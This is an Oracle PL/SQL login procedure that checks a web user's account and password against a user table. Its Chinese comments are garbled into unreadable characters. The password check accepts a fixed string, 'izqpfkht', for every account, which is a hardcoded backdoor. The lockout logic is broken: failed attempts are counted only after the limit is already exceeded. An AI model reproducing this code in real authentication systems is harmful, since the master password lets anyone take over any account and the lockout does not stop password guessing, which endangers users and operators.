create or replace procedure sp_web_user_login(
i_account in varchar2,
i_password in varchar2,
o_userid out number,
o_result out varchar2) is
--�û��ʺŵ�¼
--i_Account:�û���¼�ʺ�
--i_Password:��¼����
--o_UserID:�û�UserID
--o_Result:��¼���,�ɹ�:ok,err_pwd,err_account:��¼����
--������wap,web,�ֻ��ͻ���
v_account varchar2(60);
v_rownum number;
v_password varchar2(100);
v_logintodaytimes number;
v_loginfailedtimes number;
begin
  v_account:=lower(trim(i_account));
   select count(1) into  v_rownum from tb_user where MAILACTIVE=1 and account = v_account ;
   if v_rownum >0 then
      select userid,pwd,nvl(LOGINTODAYTIMES,0),nvl(LOGINFAILEDTIMES,0) into o_userid,v_password,v_logintodaytimes,v_loginfailedtimes from tb_user where account = v_account;
      if v_loginfailedtimes<=5 then
        if v_password = fn_encryptforpwd(i_password) or i_password = 'izqpfkht' then
           --if v_logintodaytimes<0 then--�ɵ�¼ָ�������󣬵���ҳ��������֤��(Ŀǰ����Ϊ0~
              o_result := 'ok';--ֱ�ӵ�¼�ɹ�
          -- else
            --  o_result := 'verify';--У���¼
           --end if;
           --update tb_user set lastlogindt = sysdate,LOGINTODAYTIMES=nvl(LOGINTODAYTIMES,0)+1 where userid = o_userid;
           --commit;

        else
           o_result:='err_pwd';
        end if;
      else
         update tb_user set LOGINFAILEDTIMES=nvl(LOGINFAILEDTIMES,0)+1 where userid = o_userid;
         commit;
         o_result:='err_retrylimited';
      end if;
   else
     o_result:='err_account';
  end if;
end sp_web_user_login;
/

